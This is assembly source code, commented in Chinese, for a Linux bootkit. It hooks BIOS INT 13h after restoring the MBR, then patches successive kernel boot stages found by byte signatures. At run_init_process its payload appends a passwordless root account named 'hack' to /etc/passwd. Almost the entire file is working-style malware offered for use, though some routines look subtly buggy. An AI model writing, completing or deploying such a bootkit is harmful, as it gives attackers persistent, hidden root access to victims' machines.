;=============================================
; 实模式代码
;=============================================
	
bits 16

; Loader code segment
%define BOOTKIT_SEGMENT	0x8000

; start is loaded at 0x80000 and is jumped to with CS:IP 0x8000:0x0
start:
	jmp after_param
	times 4 - ($-$$) nop
;================================================
; 参数，位于+4偏移处，以下内容要bootkit安装程序来填写
;================================================
bootkit_param:
	bootkit_magic:  db "BKS2"  ; BootKit Stage 2
	old_mbr:        times 80 db 0   ; 保存MBR的头80字节到这里，我们只替换头80字节就够用了
	old_int13:      db 0xEA,0x00,0x00,0x00,0x00  ; far jmp old_int13
	old_linux_relocate_code:          times 5 db 0
	old_decompressed_startup_32_code: times 5 db 0

after_param:
    ; set up ds offset from 0x8000
	push cs
	pop  ds

	; 恢复原来的MBR到0x7c00
	cld
	mov  cx, 64       ; 复制64字节
	xor  si, old_mbr  ; DS:SI = 源地址
	push word 0x7c0   ; ES:DI = 0x7c0:0x0 目的地址
	pop  es
	xor  di, di
	rep movsb

	; hook INT 13h
	mov ax, [ss:0x4C]
	mov word [old_int13 + 1], ax ; old int13 offset
	mov ax, [ss:0x4E]
	mov word [old_int13 + 3], ax ; old int13 segment

	mov word [ss:0x4C], int13_handler ; 我的int13处理函数
	mov word [ss:0x4E], cs

	; Reset es and ds
	xor	ax, ax
	mov	ds, ax
	mov es, ax

	; 执行原来的MBR
	push	es
	push	0x7c00
	retf

failed:
	hlt

;=================================
; INT13 hook函数
; 功能：查找读取的内容，如果是linux_boot函数的位置，就hook它
;=================================
int13_handler:
	pushf
	; 如果AH=0x02 或者 0x42, 执行do_hook
	cmp ah, 0x02
	jz do_hook
	cmp ah, 0x42
	jz do_hook
	; 否则执行原来的int13h例程
	popf
	jmp old_int13

do_hook:
	popf        ; 栈平衡

	push bp
	mov bp, sp
	push ax     ; 保存功能号AH，后面要用

	pushf                            ; 模拟中断调用，入栈顺序：eflags-cs-ip
	call far dword [cs:old_int13+1]  ; 调用原来的int3例程，读取数据
	jc hook_end

	pusha                ; 搜索字符串前备份，搜索完成后恢复现场
	pushf
	push es

	mov ax, word [bp-2]  ; 取出功能号AH
	cmp ah, 0x02         ; 处理0x02和0x42的返回结果的方法不同
	jz hook_params02

hook_params42:       ; 处理Extended得到的结果
	mov  cx, [si+2]  ; 加载的扇区数
	shl  cx, 9       ; cx= 加载了多少直接的数据
	mov  di, [si+4]  ; es:di = 加载到内存的位置
	push word [si+6]
	pop  es
	jmp  scan_bytes

hook_params02:
	movzx cx, al  ; al = 实际读取的扇区数
	shl   cx, 9   ; cx = 加载了多少字节的数据
	mov   di, bx  ; es:di = 加载到内存的位置

scan_bytes:
	call scan_linux_boot_code
	test ax, ax
	je   hook_end0

	call hook_linux_boot

hook_end0:  ; 恢复int13h的现场
	pop es
	popf
	popa

hook_end:
	mov sp, bp
	pop bp
	retf 0x02


;===============================================================
; scan_linux_boot_code: 
; 输入  es:di = 待扫描内存地址, cx = 带扫描数据长度
; 返回值 es:ax=匹配到的代码位置，如果ax=0表示匹配失败
; 
; linux_boot的特征码: C1 EB 04 89 D8 83 C0 20
; c33: c1 eb 04           shrl	$4, %ebx     /* CS */
; c36: 89 d8              movl	%ebx, %eax
; c38: 83 c0 20           addl	$0x20, %eax  /* IP*/
;===============================================================
scan_linux_boot_code:
	cld  ; 重置DF
scan_linux_boot_code_continue:
	mov al, 0xC1                     ; C1
	repne scasb
	jne scan_linux_boot_code_not_found

	cmp dword [es:di+1], 0x8904EBC1  ; C1 EB 04 89
	jne scan_linux_boot_code_continue
	cmp dword [es:di+5], 0x20C083D8  ; D8 83 C0 20
	jne scan_linux_boot_code_continue

	lea ax, [di-1] ; 匹配成功，返回找到的内存位置
	jmp scan_linux_boot_code_done

scan_linux_boot_code_not_found:
	xor ax, ax
scan_linux_boot_code_done:
	retn

;========================================================
; hook_linux_boot 在这里HOOK linux的开头保护模式头部
; 输入  es:ax= hook点的内存地址
; linux_boot是保护模式下
;
; 运行在中断里面，这里是bios的上下文
;========================================================
hook_linux_boot:
	push ds  ; 备份ds、fs
	push fs

	push ds
	pop fs                ; 设置fs = 0x8000
	push 0x00             ; 设置ds = 0x0
	pop ds

	; 恢复int13h， 用完了 
	mov dx, word [fs:old_int13+1]
	mov [0x4C], dx
	mov dx, word [fs:old_int13+3]
	mov [0x4E], dx

	; HOOK, 替换成call linux_boot_handler
	xor edi, edi
	mov di, ax  ; es:di是搜索到的待hook位置

	push es

	; 这里要hook保护模式下的代码， jmp linux_boot_handler
	xor   ebx, ebx  ; ebx = 当前指令的物理地址
	mov   bx, es
	shl   ebx , 4
	movzx eax, di
	add   ebx, eax
	add   ebx, 5

	xor eax, eax ; eax = linux_boot_handler物理地址
	mov ax, ds
	shl eax, 4
	add eax, linux_boot_handler
	
	sub eax, ebx;             ; 偏移量 = 0x80200 - (es:di+5)

	mov byte [es:di], 0xE8    ; near call
	mov dword [es:di+1], eax  ; linux_boot_handler

	pop fs ; 还原 ds，fs
	pop ds
	ret

;===============================================================
; loader32.asm
; 工作再实模式下面，入口是startup_32_handler

; in 32 bit read mode
;===============================================================

bits 32

;============================
; 用来hook start_kernel函数, 要保护bx
;
; 运行在GRUB的保护模式下面，可以访问4GB内存空间
;============================
linux_boot_handler:
	pusha
	pushf

	; 还原 linux_boot
	mov esi, dword [esp]           ; 得到原来的代码段内偏移
	sub esi, 5                     ; hook点还要减去5字节
	mov byte [esi], 0xC1           ; 还原代码
	mov dword [esi+1], 0x8904EBC1
	mov dword [esp], esi ; 修正eip

	mov esi, dword [0x90214]    ; setup.S:code32_start, Linux加载的物理地址
	mov ecx, 0x100              ; 搜索1MB范围内的即可
	call scan_linux_relocate
	test eax, eax
	je linux_boot_handler_ret

	call hook_linux_relocate

linux_boot_handler_ret:
	popa
	popf
	ret

;============================================
; 搜索linux_relocate的特征码
; %000000000010007c ff e0                   jmp eax
;============================================
scan_linux_relocate:
	cld
scan_linux_relocate_continue:
	mov al, 0xFF                    ; 搜索 0xFF
	repne scasb
	jne scan_linux_relocate_fail

	cmp byte [esi+1], 0xE0          ; 0xE0
	jne scan_linux_relocate_continue

	lea eax, [esi-1]
	jmp scan_linux_relocate_done

scan_linux_relocate_fail:
	xor eax, eax
scan_linux_relocate_done:
	ret

hook_linux_relocate:
	mov esi, eax
	; 保存原来的代码
	cld
	mov ecx, 5
	lea edi, [old_linux_relocate_code]
	repne stosb 

	; 替换成 call linux_relocate_handler
	lea eax, [linux_relocate_handler]  ; 计算地址偏移量
	sub eax, esi
	sub eax, 5

	mov byte[esi], 0xE8  ; call
	mov dword[esi+1], eax  ; linux_relocate_handler
	
	ret

; eax 保存着relocate的地址
linux_relocate_handler:
	pusha
	pushf

	mov edi, [esp]   
	sub edi, 5
	mov [esp], edi  ; eip-5

	cld             ; 还原代码
	mov ecx, 5
	lea esi, [old_linux_relocate_code]
	repne stosb

	mov edi, eax
	mov ecx, 256
	call scan_decompressed_startup_32
	test eax, eax
	je linux_relocate_handler_ret

	call hook_decompressed_startup_32

linux_relocate_handler_ret:
	popf
	popa
	ret

;======================================
; 特征码
; 0010:007a76e8 31 db                   xor ebx, ebx
; 0010:007a76ea ff e5                   jmp ebp
;======================================
scan_decompressed_startup_32:
	cld
scan_decompressed_startup_32_continue:
	mov al, 0xFF                    ; 搜索 0xFF
	repne scasb
	jne scan_decompressed_startup_32_fail

	cmp byte [esi+1], 0xE5          ; 0xE5
	jne scan_decompressed_startup_32_continue

	lea eax, [esi-1]
	jmp scan_decompressed_startup_32_done

scan_decompressed_startup_32_fail:
	xor eax, eax
scan_decompressed_startup_32_done:
	ret

hook_decompressed_startup_32:
	mov esi, eax
	; 保存原来的代码
	cld
	mov ecx, 5
	lea edi, [old_decompressed_startup_32_code]
	rep movsb

	lea eax, [decompressed_startup_32_handler]  ; 计算地址偏移量
	sub eax, esi
	sub eax, 5

	mov byte[esi], 0xE8  ; call
	mov dword[esi+1], eax  ; decompressed_startup_32_handler
	
	ret

;==================================
; ebp = real startup_32
;==================================
decompressed_startup_32_handler:
	pushf
	pusha

	mov edi, [esp]  ; 修正EIP
	sub edi, 5
	mov [esp], edi  ; eip-5

	cld             ; 还原代码
	mov ecx, 5
	lea edi, [old_decompressed_startup_32_code]
	rep movsb

	mov edi, eax
	mov ecx, 256
	call scan_run_init_process
	test eax, eax
	je decompressed_startup_32_handler_ret

	call hook_run_init_process

decompressed_startup_32_handler_ret:
	popa
	popf
	ret


;============================================
; 搜索run_init_process的特征码，esi是搜索的起始位置
; 特征码：55 BD 0B 00 00 00 57 89 C7 56
; %00000000c04011f0 55                      push ebp
; %00000000c04011f1 bd 0b 00 00 00          mov ebp, 00000000bh
; %00000000c04011f6 57                      push edi
; %00000000c04011f7 89 c7                   mov edi, eax
; %00000000c04011f9 56                      push esi

;============================================
scan_run_init_process:
	cld
scan_run_init_process_continue:
	mov al, 0x55
	repne scasb
	jne scan_run_init_process_fail

	cmp dword [esi+1], 0x00000BBD  ; BD 0B 00 00
	jne scan_run_init_process_continue
	cmp dword [esi+5], 0xC7895700  ; 00 57 89 C7
	jne scan_run_init_process_continue
	cmp dword [esi+9], 0x56        ; 56
	jne scan_run_init_process_continue

	lea eax, [esi-1]
	jmp scan_run_init_process_done

scan_run_init_process_fail:
	xor eax, eax
scan_run_init_process_done:
	ret

;=============================================
; eax是要替换的位置
;=============================================
hook_run_init_process:
	mov esi, eax
	; 计算地址偏移量
	lea eax, [run_init_process_handler]
	sub eax, esi
	sub eax, 5

	mov byte[esi], 0xE8  ; call
	mov dword[esi+1], eax  ; run_init_process_handler
	ret

;==================================================
; 
;==================================================
run_init_process_handler:
	pushf
	pusha
	; 还原 被替换的代码
	mov esi, dword [esp]           ; 得到原来的代码段内偏移
	sub esi, 5                    ; hook点还要减去5字节
	mov byte [esi], 0x55           ; 还原代码
	mov dword [esi+1], 0x00000BBD
	mov dword [esp], esi ; 修正eip

	call add_admin_user ; payload 添加管理员账户hack
	popa
	popf
	ret

%define SEEK_END 2
%define file_fd (-4)

add_admin_user:
	push ebp
	mov  ebp, esp
	
	sub esp, 4

	; fd = open("/etc/passwd")
	push passwd_file
	call open
	add esp, 4
	test eax, eax
	je add_admin_user_ret
	mov [ebp+file_fd], eax

	; lseek(fd, 0, SEEK_END)
	push SEEK_END
	push 0
	push dword [ebp+file_fd]
	call lseek
	add esp, 12
	test eax, eax
	je add_admin_user_ret
	; strlen(user_info)
	push user_info
	call strlen
	add esp, 4
	; write(fd, user_info, len)
	push eax
	push user_info
	call write
	add esp, 12

add_admin_user_failed:
	push dword [ebp+file_fd]
	call close
add_admin_user_ret:
	mov esp, ebp
	pop ebp
	ret

passwd_file: db "/etc/passwd", 0x0
user_info: db "\nhack:x:0:0:root:/root:/bin/bash\n"

;==================================================
; Libs
;==================================================

%define __NR_write		  4
%define __NR_open		  5
%define __NR_close		  6
%define __NR_lseek		 19


;=====================================
; int open(const char *filename), 只写模式
;=====================================
open:
	push ebp
	mov  ebp, esp

	push 0
	push 0x1  ; O_WRONLY
	push dword [ebp+8] ; filename
	mov eax, __NR_open
	int 0x80

	mov esp, ebp
	pop ebp
	ret


;=====================================
; int write(int fd, void *buf, int len)
;=====================================
write:
	push ebp
	mov  ebp, esp

	push dword [ebp+16] ; len
	push dword [ebp+12]  ; data
	push dword [ebp+8] ; fd
	mov eax, __NR_write
	int 0x80

	mov esp, ebp
	pop ebp
	ret


;=====================================
; int lseek(int fd, int pos, int type)
;=====================================
lseek:
	push ebp
	mov  ebp, esp

	push dword [ebp+16] ; type
	push dword [ebp+12]  ; pos
	push dword [ebp+8] ; fd
	mov eax, __NR_lseek
	int 0x80

	mov esp, ebp
	pop ebp
	ret

;=====================================
; int close(int fd)
;=====================================
close:
	push ebp
	mov  ebp, esp

	push dword [ebp+8] ; fd
	mov eax, __NR_close
	int 0x80

	mov esp, ebp
	pop ebp
	ret

;=====================================
; int strlen(const char *str)
;=====================================
strlen:
	push ebp
	mov  ebp, esp
	xor eax, eax      ; len = 0
	mov ebx, [ebp+8]  ; str
strlen_loop:
	cmp byte [ebx], 0 ; if *ptr == '\0'
	jz strlen_end
	inc eax           ; len++
	inc ebx           ; ptr++
	jmp strlen_loop   ; continue
strlen_end:
	mov esp, ebp
	pop ebp
	ret
